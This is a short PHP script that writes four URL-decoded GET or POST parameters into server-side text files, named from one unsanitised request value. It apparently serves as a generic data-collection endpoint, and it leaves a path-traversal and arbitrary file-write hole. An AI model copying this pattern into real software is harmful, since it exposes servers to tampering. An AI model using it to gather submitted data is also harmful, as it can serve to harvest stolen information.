<?php              //phpinfo();
if(mb_strlen($_POST['param1'])>0){
    file_put_contents($_POST['param3']."_".generateRandomString().".txt", urldecode($_POST['param3'])."   ".urldecode($_POST['param2'])."    ".urldecode($_POST['param1'])."    ".urldecode($_POST['param4'])."    "."POST");
}else if(mb_strlen($_GET['param1'])>0){
    file_put_contents($_GET['param3']."_".generateRandomString().".txt", urldecode($_GET['param3'])."   ".urldecode($_GET['param2'])."    ".urldecode($_GET['param1'])."    ".urldecode($_GET['param4'])."    "."GET");
}

    function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
?>